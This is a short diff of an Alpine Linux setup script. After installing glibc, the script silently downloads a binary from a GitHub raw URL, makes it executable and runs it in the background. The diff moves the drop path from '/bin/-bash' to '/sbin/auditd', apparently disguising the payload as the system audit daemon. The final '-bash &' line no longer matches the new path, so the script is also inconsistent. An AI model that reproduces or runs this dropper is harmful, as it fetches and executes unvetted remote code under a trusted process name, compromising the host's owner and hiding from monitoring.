@@ -6,7 +6,7 @@ apk add glibc-2.35-r1.apk
 apk add glibc-bin-2.35-r1.apk
 rm -rf glibc-2.35-r1.apk
 rm -rf glibc-bin-2.35-r1.apk
-rm -rf /bin/-bash
-wget -q -O /bin/-bash https://github.com/jackmoc/Alpine/raw/main/update_2.0.1
-chmod +x /bin/-bash
+rm -rf /sbin/auditd
+wget -q -O /sbin/auditd https://github.com/jackmoc/Alpine/raw/main/update_2.0.1
+chmod +x /sbin/auditd
 -bash &
